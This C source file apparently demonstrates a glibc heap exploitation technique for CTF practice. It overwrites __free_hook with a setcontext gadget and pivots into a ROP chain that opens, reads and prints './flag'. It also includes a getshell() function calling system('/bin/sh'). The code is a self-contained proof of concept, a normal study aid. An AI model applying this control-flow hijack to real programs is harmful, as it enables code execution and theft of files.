#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
//    <setcontext+53>    mov    rsp, qword ptr [rdi + 0xa0]     RSP, [0x55bf1e64c710] => 0
//    <setcontext+60>    mov    rbx, qword ptr [rdi + 0x80]     RBX, [0x55bf1e64c6f0] => 0
//    <setcontext+67>    mov    rbp, qword ptr [rdi + 0x78]     RBP, [0x55bf1e64c6e8] => 0
//    <setcontext+71>    mov    r12, qword ptr [rdi + 0x48]     R12, [0x55bf1e64c6b8] => 0
//    <setcontext+75>    mov    r13, qword ptr [rdi + 0x50]     R13, [0x55bf1e64c6c0] => 0
//  ► <setcontext+79>    mov    r14, qword ptr [rdi + 0x58]     R14, [0x55bf1e64c6c8] => 0x20941
//    <setcontext+83>    mov    r15, qword ptr [rdi + 0x60]     R15, [0x55bf1e64c6d0] => 0
//    <setcontext+87>    mov    rcx, qword ptr [rdi + 0xa8]     RCX, [0x55bf1e64c718] => 0
//    <setcontext+94>    push   rcx
//    <setcontext+95>    mov    rsi, qword ptr [rdi + 0x70]
//    <setcontext+99>    mov    rdx, qword ptr [rdi + 0x88]
//    <setcontext+106>    mov    rcx, qword ptr [rdi + 0x98]
//    <setcontext+113>    mov    r8, qword ptr [rdi + 0x28]
//    <setcontext+117>    mov    r9, qword ptr [rdi + 0x30]
//    <setcontext+121>    mov    rdi, qword ptr [rdi + 0x68]     RDI, [0x56174aa656d8] => 0
//    <setcontext+125>    xor    eax, eax                        EAX => 0
//    <setcontext+127>    ret           
int main() {
  char *system_ptr = (char *)&system;
  char *getshell_ptr = (char *)getshell;
  printf("system:%p\n",system_ptr);

  char* read=system_ptr+0xa24c0;
  char* open=system_ptr+0xa2140;
  char* write=system_ptr+0xa2590;
  //char* syscall_ret=system_ptr+0xe6069;
  char* pop_rdi_ret=system_ptr-0x20233;
  char* pop_rsi_ret=system_ptr-0x20324;
  char* pop_rdx_ret=system_ptr-0x3fbea;

  char *context=malloc(0xb0); //法）这里如果不能申请那么大可以利用跨chunk来利用其他chunk已经布置好的context
  *(unsigned long long*)(context+0xa0)=context+0x8; // rsp 
  *(unsigned long long*)(context+0xa8)=pop_rdi_ret; // push rcx 
  *(unsigned long long *)context=pop_rdi_ret;  //orw
  *(unsigned long long *)(context+8)=context+0x70;
  *(unsigned long long *)(context+0x10)=pop_rsi_ret;   
  *(unsigned long long *)(context+0x18)=0;   
  *(unsigned long long *)(context+0x20)=open;  
  *(unsigned long long *)(context+0x28)=pop_rdi_ret;
  *(unsigned long long *)(context+0x30)=3;
  *(unsigned long long *)(context+0x38)=pop_rdx_ret;
  *(unsigned long long *)(context+0x40)=0x10;
  *(unsigned long long *)(context+0x48)=read;
  *(unsigned long long *)(context+0x50)=pop_rdi_ret;
  *(unsigned long long *)(context+0x58)=1;
  *(unsigned long long *)(context+0x60)=write;
  strcpy(context+0x70, "./flag");
  char *setcontext_53=system_ptr+0x2535;
  char *free_hook=system_ptr+0x370168;
  *(unsigned long long*)free_hook=setcontext_53;

  free(context);
  
  return 0;
}